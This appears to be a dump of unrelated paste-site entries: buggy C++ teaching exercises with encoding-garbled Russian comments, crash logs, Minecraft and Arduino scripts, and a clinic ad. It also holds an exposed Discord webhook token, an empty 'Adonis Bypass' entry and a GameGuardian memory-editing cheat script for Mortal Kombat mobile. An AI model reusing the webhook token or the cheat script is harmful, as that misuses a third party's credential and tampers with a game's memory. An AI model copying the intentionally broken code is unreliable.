    return sum / (nums.size() - 1); // –û—à–∏–±–∫–∞: –¥–µ–ª–µ–Ω–∏–µ –Ω–∞ size() - 1
}

–ó–∞–¥–∞—á–∞ 9: –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —á—ë—Ç–Ω–æ—Å—Ç—å

bool isEven(int n) {
    return n % 3 == 0; // –û—à–∏–±–∫–∞: –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –¥–µ–ª–∏–º–æ—Å—Ç—å –Ω–∞ 3
}

–ó–∞–¥–∞—á–∞ 10: –ü–æ–∏—Å–∫ –º–∏–Ω–∏–º—É–º–∞

int findMin(const std::vector<int>& nums) {
    if (nums.empty()) return 0; // –û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –ø—É—Å—Ç–æ–≥–æ –º–∞—Å—Å–∏–≤–∞
    int minVal = nums[0];
    for (int num : nums) {
        if (num < minVal) minVal = num;
    }
    return minVal;
}

–ó–∞–¥–∞—á–∞ 11: –í–æ–∑–≤–µ–¥–µ–Ω–∏–µ –≤ —Å—Ç–µ–ø–µ–Ω—å

int power(int base, int exp) {
    int result = 1;
    for (int i = 0; i < exp; ++i) {
        result *= base;
    }
    return result;
}

–ó–∞–¥–∞—á–∞ 12: –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—Ç—Å–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ—Å—Ç—å

bool isSorted(const std::vector<int>& nums) {
    for (int i = 0; i < nums.size(); ++i) { // –û—à–∏–±–∫–∞: –∏–Ω–¥–µ–∫—Å–∞—Ü–∏—è
        if (nums[i] > nums[i + 1]) return false;
    }
    return true;
}

–ó–∞–¥–∞—á–∞ 13: –£–¥–∞–ª–µ–Ω–∏–µ –¥—É–±–ª–∏–∫–∞—Ç–æ–≤

std::vector<int> removeDuplicates(const std::vector<int>& nums) {
    std::vector<int> result;
    for (int num : nums) {
        if (result.back() == num) continue; // –û—à–∏–±–∫–∞: back() –Ω–∞ –ø—É—Å—Ç–æ–º –≤–µ–∫—Ç–æ—Ä–µ
        result.push_back(num);
    }
    return result;
}

–ó–∞–¥–∞—á–∞ 14: –ü–æ–∏—Å–∫ –∏–Ω–¥–µ–∫—Å–∞ —ç–ª–µ–º–µ–Ω—Ç–∞

int findIndex(const std::vector<int>& nums, int target) {
    for (int i = 0; i < nums.size(); ++i) {
        if (nums[i] == target) return i;
    }
    return -1;
}

–ó–∞–¥–∞—á–∞ 15: –ü–µ—Ä–µ–≤–æ–¥ –≤ –≤–µ—Ä—Ö–Ω–∏–π —Ä–µ–≥–∏—Å—Ç—Ä

std::string toUpperCase(const std::string& str) {
    std::string upper;
    for (char c : str) {
        upper += c + 'A' - 'a'; // –û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ
    }
    return upper;
}

–ó–∞–¥–∞—á–∞ 16: –ü–æ–¥—Å—á—ë—Ç —Å–ª–æ–≤

int countWords(const std::string& str) {
    int count = 0;
    bool inWord = false;
    for (char c : str) {
        if (c == ' ') inWord = false;
        else if (!inWord) {
            count++;
            inWord = true;
        }
    }
    return count;
}

–ó–∞–¥–∞—á–∞ 17: –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∞–Ω–∞–≥—Ä–∞–º–º—É

bool areAnagrams(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) return false;
    std::sort(a.begin(), a.end()); // –û—à–∏–±–∫–∞: sort() –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç —Å–æ —Å—Ç—Ä–æ–∫–∞–º–∏
    std::sort(b.begin(), b.end());
    return a == b;
}

–ó–∞–¥–∞—á–∞ 18: –í—ã—á–∏—Å–ª–µ–Ω–∏–µ –ù–û–î

int gcd(int a, int b) {
    while (b != 0) {
        int temp = b;
        b = a % b;
        a = temp;
    }
    return a;
}

–ó–∞–¥–∞—á–∞ 19: –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤—Ö–æ–∂–¥–µ–Ω–∏–µ –ø–æ–¥—Å—Ç—Ä–æ–∫–∏

bool containsSubstring(const std::string& str, const std::string& substr) {
    return str.find(substr) != std::string::npos;
}

–ó–∞–¥–∞—á–∞ 20: –£–º–Ω–æ–∂–µ–Ω–∏–µ –º–∞—Ç—Ä–∏—Ü

std::vector<std::vector<int>> multiplyMatrices(
    const std::vector<std::vector<int>>& a,
    const std::vector<std::vector<int>>& b) {
    int n = a.size();
    int m = b[0].size();
    std::vector<std::vector<int>> result(n, std::vector<int>(m, 0));
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < m; ++j) {
            for (int k = 0; k < a[0].size(); ++k) {
                result[i][j] += a[i][k] * b[k][j]; // –û—à–∏–±–∫–∞: –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –∏–Ω–¥–µ–∫—Å—ã
            }
        }
    }
    return result;
}"
AA2AnESS,Untitled,POdkovyrkinDaniil,C#,Monday 9th of June 2025 02:34:55 AM CDT,"using System;

namespace System
{
    class Class
    {
        static void Main(string[] args)
        {
            Random generator = new Random();
            int minNumber = 10;
            int maxNumber = 25;
            int number = generator.Next(minNumber, maxNumber + 1);
            int result = 0;
            int minBorder = 50;
            int maxBorder = 150;

            for (int i = 0; i <= maxBorder; i += number)
            {
                if (i >= minBorder)
                {  
                    result++;
                }
            }

            Console.WriteLine(result);
        }
    }
}"
y1D6eFyY,2025-06-09T14:45:27.103944,powerampache,PHP,Monday 9th of June 2025 01:45:28 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
	at java.lang.Thread.run(Thread.java:1012)

"
4vne3ZdS,2025-06-09T08:10:59.760978,powerampache,PHP,Monday 9th of June 2025 01:10:59 AM CDT,"1.01-76-play (76) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Invalid Login - passphrase does not match"",""errorType"":""system""}
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:268)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.app.ActivityThread.main(ActivityThread.java:8934)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:578)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1103)

authorize() - {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Invalid Login - passphrase does not match"",""errorType"":""system""}"
Qzn8eepx,Gate control Draconic Core,Revector,Lua,Monday 9th of June 2025 12:52:20 AM CDT,"local config = {
    -- maxCoreEnergy - –Ω–∞ —ç—Ç–æ–º —É—Ä–æ–≤–Ω–µ –±—É–¥–µ—Ç –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—Ç—å—Å—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —ç–Ω–µ—Ä–≥–∏–∏ –≤ —è–¥—Ä–µ
    -- 1000 * 10^9 —Å–æ–æ—Ç–≤–µ—Ç—Å–≤—É–Ω—Ç 1000 B –∏–ª–∏ 1 T
    maxCoreEnergy = 1000 * 10^9,
    maxDiffEnergy = 10000, -- –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å–∫–æ—Ä–æ—Å—Ç—å –Ω–∞–∫–∞–ø–ª–∏–≤–∞–Ω–∏—è —ç–Ω–µ—Ä–≥–∏–∏ Rf/t, —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–ª–æ—Å—å –Ω–∞ —ç—Ç–æ–º –∑–Ω–∞—á–µ–Ω–∏–∏
    step = 5000,  -- —à–∞–≥ –∏–∑–º–µ–Ω–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏—è –Ω–∞ –≥–µ–π—Ç–µ

    sleepTime = 1, -- —à–∞–≥ –∑–∞–º–µ—Ä–æ–≤ –≤ —Å–µ–∫
}

local com = require('component')
local gpu = com.gpu
gpu.setResolution(80, 25) -- lvl 2

local function coreEnergy()
    return com.draconic_rf_storage.getEnergyStored()
end

local function format(num)
    if num > 10^12 then
        return string.format(""%0.3f T"", num/10^12)
    elseif num > 10^9 then
        return string.format(""%0.3f B"", num/10^9)
    elseif num > 10^6 then
        return string.format(""%0.3f M"", num/10^6)
    elseif num > 10^3 then
        return string.format(""%0.3f K"", num/10^3)
    else
        return string.format(""%d"", num)
    end
end

local filVal = 0
function expRunningAvg(newVal)
    filVal = filVal + ((newVal-filVal) * 0.3)
    return filVal
end

if false == com.isAvailable(""draconic_rf_storage"") then
    print(""Rf storage not connected!"")
    os.exit()
end

if false == com.isAvailable(""flux_gate"") then
    print(""Flux gate not connected!"")
    os.exit()
end

local time = os.time()
local energy = coreEnergy()

local w, h = gpu.getResolution()
function asbMax(t)
    local  max = t[1]
    for _, val in ipairs(t) do
        if math.abs(val) > max then
            max = math.abs(val)
        end
    end

    return max
end

local _MID = h/2 + 3
local _NUM_READ = w
local energyLog = {}
local current = 0

function displayGraph(diff)
    current = current + 1
    if current > _NUM_READ then
        current = 1
    end

    energyLog[current] = diff

    local maxVal = asbMax(energyLog)

    gpu.fill(1, _MID, w, 1, '‚îÅ')
    local row = 1
    for i = current, _NUM_READ + current - 1 do
        local key = i % w + 1

        if energyLog[key] then
            local d = (math.ceil(energyLog[key] / (maxVal * 0.1)))
            if d > 0 then
                gpu.fill(row, _MID-d, 1, d, '‚ñà')
            else
                gpu.fill(row, _MID+1, 1, math.abs(d), '‚ñà')
            end
        end

        row = row + 1
    end
end

function displayData(core, diff, action, fluxGateFlow)
    gpu.fill(1, 1, w, h, "" "")
    gpu.set(2, 1, string.format("" –≠–Ω–µ—Ä–≥–∏–∏ –≤ —è–¥—Ä–µ: %s [%0.0f Rf]"", format(core), core))
    gpu.set(2, 2, string.format("" –í—ã—Ö–æ–¥ –Ω–∞ –≥–µ–π—Ç–µ: %s Rf [%0.0f Rf]  %s"", format(fluxGateFlow), fluxGateFlow, action))
    gpu.set(2, 3, string.format(' –ù–∞–∫–æ–ø–ª–µ–Ω–∏–µ —ç–Ω–µ—Ä–≥–∏–∏: %0.1f Rf/t', diff))

    displayGraph(diff)
end

local running = true
while running do
    os.sleep(config.sleepTime)

    local tmpEnergy = coreEnergy()
    local tmpTime = os.time()

    local energyDiff = tmpEnergy - energy
    local timeDiff = tmpTime - time

    local diff = expRunningAvg(energyDiff / timeDiff)

    local fluxGateFlow = com.flux_gate.getFlow();

    local action = """"

    if tmpEnergy > config.maxCoreEnergy then
        if diff > (config.maxDiffEnergy * -1) then
            action = '–ü–æ–≤—ã—à–∞—é ‚ñ≤'
            com.flux_gate.setSignalLowFlow(fluxGateFlow + config.step)
        end
    else
        if diff < config.maxDiffEnergy then
            action = '–ü–æ–Ω–∏–∂–∞—é ‚ñº'
            com.flux_gate.setSignalLowFlow(fluxGateFlow - config.step)
        end
    end

    displayData(tmpEnergy, diff, action, fluxGateFlow)

    time = tmpTime
    energy = tmpEnergy
end
"
dXArsMfR,**Fall Detection** rev_01,pleasedontcode,Arduino,Monday 9th of June 2025 12:38:03 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Fall Detection**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-06-09 05:34:17

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* it wont reset after i pressed cancellation button */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include ""TinyGPS.h"" // Include TinyGPS library
#include ""SoftwareSerial.h"" // Include SoftwareSerial library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t cancellationbutton_PushButton_PIN_D2		= 2;
#define buttonPin 8 // Confirmation button
#define cancelButtonPin 7 // Cancellation button

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t myLED_LED_PIN_D3		= 3;
#define buzzerPin 6 // Buzzer pin
#define ledPin 5 // LED pin

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool	myLED_LED_PIN_D3_rawData		= 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float	myLED_LED_PIN_D3_phyData		= 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
SoftwareSerial GPRS(2,3); // RX=pin 2, TX=pin 3
SoftwareSerial serial_connection(10, 11); // RX=pin 10, TX=pin 11
TinyGPSPlus gps; // This is the GPS object that will work with the NMEA data

// Pins and variables declarations
float latitude=0; 
float longitude=0;                       
String Speed="""";
int Contrast=20;

// Accelerometer pins
#define x A1
#define y A2
#define z A3

// Pulse Sensor pin
#define pulseSensorPin A0 

// Variables corresponding to accelerometer
int xsample=0;
int ysample=0;
int zsample=0;

#define samples 10 // number of sample readings in still case
#define fallThreshold 650 // Fall Detection Threshold

// Threshold maximum and minimum values of change in acceleration when fall is detected
#define minVal -50
#define MaxVal 50

// Variables tracking button state
bool isFallDetected = false;
bool isFallConfirmed = false;
bool isFallCancelled = false;

// Assign timing
unsigned long fallTime; // when fall is detected
unsigned long confirmationTimeout = 5000; // Time wait for confirmation or cancellation button is 5 seconds
unsigned long confirmationWaitTime; // Time to wait for confirmation

// Pulse sensor variables
int pulseValue = 0;
unsigned long lastBeatTime = 0; // Last time heartbeat detected
unsigned long beatInterval = 0; // Time interval between beats
int heartRate = 0; // heart rate in BPM
int pulseThreshold = 512; // default threshold for pulse

// Function declarations
void triggerFallConfirmation(); 
void sendAlert(); 
void resetPotentiometer(); 

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(9600); // Start serial communication
	serial_connection.begin(9600); // This opens up communications to the GPS
	Serial.println(""successfully Initialized...."");
	Serial.println(""GPS Start""); // Just show to the monitor that the sketch has started
	
	// Taking samples in still case
	for(int i=0; i<samples; i++)  
	{    
		xsample += analogRead(x);    
		ysample += analogRead(y);    
		zsample += analogRead(z);  
	}    

	// Taking average
	xsample /= samples;  
	ysample /= samples;  
	zsample /= samples;  
	Serial.println(xsample);  
	Serial.println(ysample);  
	Serial.println(zsample);  
	delay(1000);  

	// Set pin mode for button, buzzer and led  
	pinMode(cancellationbutton_PushButton_PIN_D2, INPUT_PULLUP);
	pinMode(buttonPin, INPUT_PULLUP); // Confirmation button  
	pinMode(cancelButtonPin, INPUT_PULLUP); // Cancellation button  
	pinMode(buzzerPin, OUTPUT); // Buzzer pin  
	pinMode(ledPin, OUTPUT); // LED pin  
	pinMode(pulseSensorPin, INPUT); // Pulse sensor pin  
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	updateOutputs(); // Refresh output data
	
	while(serial_connection.available()) // While there are characters to come from the GPS  
	{    
		gps.encode(serial_connection.read()); // This feeds the serial NMEA data into the library one char at a time      
	}  
	if(gps.location.isUpdated())  
	{    
		// Get the latest info from the gps object which it derived from the data sent by the GPS unit    
		Serial.println(""Satellite Count : "");    
		Serial.println(gps.satellites.value());    
		Serial.println(""Latitude : "");    
		Serial.println(gps.location.lat(), 6);    
		Serial.println(""Longitude : "");    
		Serial.println(gps.location.lng(), 6);    
		Serial.println(""Speed MPH : "");    
		Serial.println(gps.speed.mph());    
		Serial.println(""Altitude Feet : "");    
		Serial.println(gps.altitude.feet());    
		Serial.println("""");  
	}  

	int value1 = analogRead(x);    
	int value2 = analogRead(y);    
	int value3 = analogRead(z);    
	int xValue = xsample - value1;    
	int yValue = ysample - value2;    
	int zValue = zsample - value3;        

	Serial.print(""x="");    
	Serial.println(xValue);    
	Serial.print(""y="");    
	Serial.println(yValue);    
	Serial.print(""z="");    
	Serial.println(zValue);    

	// Pulse sensor reading    
	pulseValue = analogRead(pulseSensorPin); // Read value from x axis potentiometer    
	pulseThreshold = map(analogRead(x), 0, 1023, 400, 600); // Adjust threshold range (400-600)    
	Serial.print(""Pulse Value : "");    
	Serial.println(pulseValue);    
	Serial.print(""Pulse Threshold : "");    
	Serial.println(pulseThreshold);    

	if(pulseValue > pulseThreshold)    
	{      
		if(millis() - lastBeatTime > 500) // Only count a beat every 500ms (roughly 60BPM)        
		{        
			heartRate = 60000 / (millis() - lastBeatTime); // Calculate heart rate in beats per minute        
			lastBeatTime = millis();        
			Serial.print(""Heart Rate : "");        
			Serial.println(heartRate);        
			// Check if heart rate is abnormal        
			if(heartRate < MIN_HEART_RATE || heartRate > MAX_HEART_RATE)        
			{          
				Serial.println(""Abnormal heart rate detected. Please confirm if fall has occured."");          
				triggerFallConfirmation(); // Confirm whether there's a fall or not        
			}              
		}    
	}  

	// Condition for Fall Detection    
	if(xValue < minVal || xValue > MaxVal || yValue < minVal || yValue > MaxVal || zValue < minVal || zValue > MaxVal)    
	{ // Fall Detected, send SMS to emergency contact        
		Serial.println(""Fall Detected, Please press the button to confirm..."");        
		isFallDetected = true; // When fall is detected                
		
		// Buzzer and LED on when fall is detected        
		digitalWrite(buzzerPin, HIGH); // Buzzer On        
		digitalWrite(ledPin, HIGH); // LED on        
		fallTime = millis(); // Record time when fall is detected        
		confirmationWaitTime = fallTime + confirmationTimeout; // Set timeout time for confirmation        

		// Confirmation button        
		while (!isFallConfirmed && !isFallCancelled && millis() < confirmationWaitTime)        
		{          
			// Wait for confirmation or cancellation button press          
			if (digitalRead(buttonPin) == LOW) // If confirmation button is pressed            
			{            
				isFallConfirmed = true;            
				Serial.println(""Fall is confirmed!"");            
				sendAlert(); // Send SMS alert            
				break; // Exit loop once fall is confirmed          
			}          
			if (digitalRead(cancelButtonPin) == LOW)            
			{            
				isFallCancelled = true; // If cancellation button is pressed            
				Serial.println(""Fall Detection cancelled"");            
				// Do not reset the state after cancellation
				digitalWrite(buzzerPin, LOW); // Buzzer off            
				digitalWrite(ledPin, LOW); // LED off            
				break;          
			}                  
		}        

		// If no confirmation or cancellation button is pressed, automatically confirm the fall        
		if(!isFallConfirmed && millis() >= confirmationWaitTime) 
		{          
			isFallConfirmed = true;          
			Serial.println(""No response, fall Detection is confirmed"");          
			sendAlert(); // send SMS automatically        
		}        

		// After confirmation or cancellation, reset fall detection        
		if (isFallCancelled)        
		{          
			resetPotentiometer(); // Reset Potentiometer values after confirmation          
			isFallDetected = false;          
			isFallConfirmed = false;          
			// Do not reset isFallCancelled to allow for further cancellations
			Serial.println(""Fall Detection reset."");          
			// Reset after cancellation and continue monitoring          
			digitalWrite(buzzerPin, LOW); // Buzzer off          
			digitalWrite(ledPin, LOW); // LED off        
		}        
	}      
	delay(1000);
}

void updateOutputs()
{
	digitalWrite(myLED_LED_PIN_D3, myLED_LED_PIN_D3_rawData);
}

// Send SMS alert
void sendAlert() 
{   
	// Initialize GPRS module        
	GPRS.begin(9600);        
	Serial.println(""Connecting to network..."");        
	delay(2000); // wait for network connection        
	Serial.println(""Should be connected to network by now"");        
	
	// Send SMS alerts with location        
	GPRS.print(""AT+CMGF=1\r""); // set SMS format to text mode        
	delay(1200);         
	GPRS.print(""AT+CMGS=\""+01xxxxxxxxx\""\r""); // Set phone number to send alert with (replace with actual number)
	delay(1200);                 
	
	// Message        
	GPRS.print(""Fall Detected!"");        
	GPRS.print(""Location:\n"");        
	GPRS.print(""Latitude : "");        
	GPRS.print(latitude);        
	GPRS.print(""\nLongitude : "");        
	GPRS.print(""\nGoogle Maps Link: http://maps.google.com/maps?&z=15&mrt=yp&t=k&q="");        
	GPRS.println(latitude);        
	GPRS.println(""+"");        
	GPRS.println(longitude);        
	GPRS.write(26); // Send SMS         
	GPRS.println(""SMS Sent!"");      
}

// Function resetting potentiometer
void resetPotentiometer() 
{  
	xsample = 0;  
	ysample = 0;  
	zsample = 0;  
	for(int i = 0; i < samples; i++) 
	{    
		xsample += analogRead(x);    
		ysample += analogRead(y);    
		zsample += analogRead(z);  
	}  
	// Average after reset  
	xsample /= samples;  
	ysample /= samples;  
	zsample /= samples;  
	Serial.println(""Potentiometer reset values: "");  
	Serial.println(xsample);  
	Serial.println(ysample);  
	Serial.println(zsample);
}

// Trigger fall confirmation based on abnormal heart rate
void triggerFallConfirmation() 
{  
	Serial.println(""Please press the confirmation button if fall has occured."");
}

/* END CODE */"
tnaVLGZ5,"Compassionate and Effective Vein Treatment in West Hollywood, CA",usveinclinics,HTML,Monday 9th of June 2025 12:30:21 AM CDT,"USA Vein Clinics in West Hollywood provides expert care for varicose veins, spider veins, and other vein conditions using advanced, minimally invasive treatments. Our experienced vein specialists offer FDA-approved procedures such as Endovenous Laser Therapy (EVLT), Radiofrequency Ablation (RFA), and Sclerotherapy to help relieve leg pain, swelling, and discomfort. At Vein center in West Hollywood, our clinic offers compassionate, effective vein care in a modern, comfortable setting. Trust our skilled team to help you feel better and regain your confidence.
https://www.usaveinclinics.com/company/locations/california/office/west-hollywood/"
5pn0fjMG,add close button on Mobile Sticky Ads,arie_cristianD,PHP,Sunday 8th of June 2025 09:49:05 PM CDT,"
function add_close_button_to_ads() {
	?>
	<script>
		/* Add Close Button for  Mobile Sticky Ads */
		(function ($) {
			$(window).ready(function () {
				var container = $('.jnews_mobile_sticky_ads'),
				wrapper = container.find('.ads-wrapper');
				wrapper.html(wrapper.html() + '<span id=""close"">X</span>');
				wrapper.find('#close').click(function (e) {
					e.preventDefault();
					$(this).parent().parent().remove();
				});
			});
		})(jQuery);
	</script>
	<?php
}
add_action( 'wp_footer', 'add_close_button_to_ads' );"
gCVsnf1r,oijhgfdsa,MoneyLiza,Java,Sunday 8th of June 2025 09:40:07 PM CDT,https://discord.com/api/webhooks/1381547118287650826/PrzmttZpjnQ8d4tXTAKP5uT6JWFIdDky0xci_nri7dZaiBBavdu9KMPoNqvSoDyoe6aY
t1w0m1An,2025-06-09T04:39:08.882157,powerampache,PHP,Sunday 8th of June 2025 09:39:07 PM CDT,"1.00-70 (70) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
zLHhSgbc,Adonis Bypass 2,Steamhesaproblox,RBScript,Sunday 8th of June 2025 09:25:18 PM CDT,
2TX9kwYv,Quary,ChicagoFire3,Lua,Sunday 8th of June 2025 08:27:29 PM CDT,"require ""GenUtil""

local straight = 0
local depth = 0
local right = 0

local x2 = straight-1
local y2 = depth
local z2 = right

function CheckDig()
  local count = turtle.getItemCount(16)
  if count > 0 then
    turtle.select(1)
    turtle.placeUp()
    EmptyUp(1)
  end
end

local GoRight = true;
local Reverse = true;

while y2 > 0 do
  y2 = y2-1
  turtle.digDown()
  turtle.down()

  while z2 > 0 do
    z2 = z2-1
    while x2 > 0 do
      x2 = x2-1
      CheckDig()
      turtle.dig()
      turtle.forward()
    end
    x2 = straight-1
    if not (z2 == 0) then
      if GoRight then
        turtle.turnRight()
        turtle.dig()
        turtle.forward()
        turtle.turnRight()
        GoRight = not GoRight
      else
        turtle.turnLeft()
        turtle.dig()
        turtle.forward()
        turtle.turnLeft()
        GoRight = not GoRight
      end
    end
  end
  turtle.turnRight()
  turtle.turnRight()
  z2 = right
end"
fRJMiqF6,Souls Seeker,pastebinserver2021,Lua,Sunday 8th of June 2025 07:55:03 PM CDT,"active = 1
gg.setVisible(false) 
gg.getResults(gg.getResultsCount())
gg.clearResults()
v = gg.getTargetInfo()
if v.x64 then
gg.getRanges() 
gg.setRanges(gg.REGION_ANONYMOUS) 
else
gg.alert(""Script Works Only On 64 Game\nDownload 64 Bit Mk Mobile and Try Again"")
os.exit()
end
-------------------------------------------------------------------------
if v.processName ~= ""com.wb.goog.mkx""then
  gg.alert(""This Script is not for\n\n"".. v.processName .. ""\n"".. v.label .. ""\n\nPlease Select the Correct Game:\nMortal Kombat"", (""EXIT""))
  gg.getResults(gg.getResultsCount())
  gg.clearResults()
  gg.toast(""Good-bye  ;-)"") 
  print(""KKBS4U SCRIPTS\nGOOD BYE :-)"")
  os.exit()
  end
-------------------------------------------------------------------------
if v.versionName ~= ""6.2.0""then 
gg.getResults(gg.getResultsCount())
gg.clearResults()  
gg.alert(""This Script is Only for:\nMortal Kombat v 6.1.0"", ""GOODBYE"", nil, (""EXIT""))
gg.toast(""Good-bye  ;-)"") 
gg.setVisible(true) 
print(""KKBS4U SCRIPTS\nGood Bye"")
os.exit()
end  
-------------------------------------------------------------------------
gg.toast(""KKBS4U SCRIPTS"")
gg.alert(""‚Ä¢‚Ä¢WELCOME‚Ä¢‚Ä¢\nxMKM Battle Mode Farming Script By KKBS4U SCRIPTS\n\nUnlimited Souls\nUnlimited Coins\nUnlimited Rare Equipments"",""ENTER"",nil,""KKBS4U SCRIPTS"")


function menu()
if AB==1 then ab=""[‚àö]"" else ab=""[  ]"" end 
if AC==1 then ac=""[‚àö]"" else ac=""[  ]"" end 
if AD==1 then ad=""[‚àö]"" else ad=""[  ]"" end 
active = 0
multi = gg.multiChoice({
ab..'Setup Final Battle', 
ac..'Remove Cassie & Fatality', 
ad..'Weak Kitana Boss',
'Exit'},nil,""xMK VIP KKBS4U SCRIPTS\nSOULS, COINS, RARE EQUIP"")
if multi == nil then return end
if multi[1] == true then ch1() end
if multi[2] == true then ch2() end
if multi[3] == true then ch3() end
if multi[4] == true then exit() end
if multi == nil then return end
end



function ch1()
if AB == 1 then 
gg.alert(""You Already Used this Hack Go Back and check final battle[‚úì]"")
menu() return
end
wait()
x=""148600100~148900100"" t=d search() visible() 
o=-3336 offset()  x=""148600100~148900100"" refine()
o=8 offset() x=""148600100~148900100"" refine()
o=288 offset() x=""17~21""refine()
o=4 offset() x=0 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=9 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=9 edit() freeze()
o=4 offset() x=0 edit() freeze()
o=4 offset() x=256 edit() freeze()
clear()
gg.toast(""Final Battle Set"")
AB = 1
return end



function ch2()
if AC == 1 then 
gg.alert(""You Already Used this Hack Go Back and check\nFatality and Cassie Removed[‚úì]"")
menu() return
end
wait()
x=""50;50;1;1;1;0:21"" t=d search() visible() 
x=50 refine() gg.searchPointer(0x12)
o=8 offset() x=1 refine() 
o=4 offset() x=1 refine()
o=52 offset() x=0 edit()
o=4 offset() x=0 edit()
o=-176 offset()  x=0 edit()
o=-4 offset() x=0 edit()
gg.searchPointer(0x1024)
o=-8 offset() x=0 edit()
clear()
gg.toast(""Fatality + Energy"")
AC = 1
return end


function ch3()
if AD == 1 then 
gg.alert(""You Already Used this Hack Go Back and Kitana boss already weak[‚úì]"")
menu() return
end
wait()
x=3000 t=d search() visible() 
o=4 offset() x=150 refine() x=1 edit()
o=4 offset() x=2000 refine() x=1 edit()
o=4 offset() x=1100 refine() x=1 edit()
o=-12 offset() x=3000 refine() x=1 edit()
clear()
gg.toast(""Kitana Weak Done"")
AD = 1
return end

--√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó
